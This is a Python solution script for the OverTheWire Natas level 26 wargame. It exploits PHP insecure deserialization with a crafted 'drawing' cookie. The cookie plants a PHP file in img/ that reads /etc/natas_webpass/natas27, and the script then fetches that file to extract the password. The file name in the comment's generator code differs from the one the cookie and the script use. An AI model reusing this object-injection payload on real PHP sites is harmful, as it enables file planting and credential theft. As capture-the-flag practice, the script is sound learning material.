import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, auth, session, proxies=None):
    print(f"[+] Logging in as {user}...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = session.get(url, auth=auth, proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)

    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)


# Function to inject malicious cookie
def deserialize_attack(url, auth, session, proxies=None):

    # The following is a php code that generate a serialized data to exploit natas27.
    # It writes a php code that reads natas27 password to a file inside the img directory.
    # This generate a base64 string that we use as a value of 'drawing' cookie.
    #
    # ----------------> Copy the code to your local machine and run it with `php name_of_the_file.php` <---------------- 
    """
    <?php

    class Logger{

        function __construct(){

            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27')?>";
            $this->logFile="img/getpass.php";
        }
    }

    $exploit = new Logger();
    echo base64_encode(serialize($exploit));
    """
    # Defining the malicious cookie
    cookie = {'drawing':"Tzo2OiJMb2dnZXIiOjI6e3M6NzoiZXhpdE1zZyI7czo2MDoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKT8+IjtzOjc6ImxvZ0ZpbGUiO3M6MTg6ImltZy9nZXRuYXRhczI3LnBocCI7fQ=="}
    
    print("[+] Injecting the malicious cookie...")
    time.sleep(1)
    # Sending the cookie to create the file
    session.get(url, auth=auth, cookies=cookie, proxies=proxies)
    
    # location of the php file
    url = url + "/img/getnatas27.php"
    
    # Requesting the newly created file to get the password
    response = session.get(url, auth=auth, proxies=proxies)
    content = response.text

    print(f"[+] Getting the password...")
    time.sleep(1)
    
    # Define regex pattern to find the password
    pattern = r'([A-Za-z0-9]{32})'
    # Using regex to search for password and extract it.
    passwd = (re.findall(pattern, content))
    print(f"[+] The password of natas27 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas27 by exploiting an insecure deserialization.")
    parser.add_argument('-p', '--password', help='Password of natas26.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas26'
    url = f'http://{user}.natas.labs.overthewire.org'
    url2 = f'http://{user}-experimenter.natas.labs.overthewire.org'
    auth = (user, args.password)
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    session = requests.Session()

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, auth, session,  proxies=proxies)
        deserialize_attack(url, auth, session, proxies=proxies)
        # getpass(url, auth, session, proxies=proxies)

    else:
        login(url, user, auth, session)
        deserialize_attack(url, auth, session)
        # getpass(url, auth, session)
    
if __name__ == "__main__":
    main()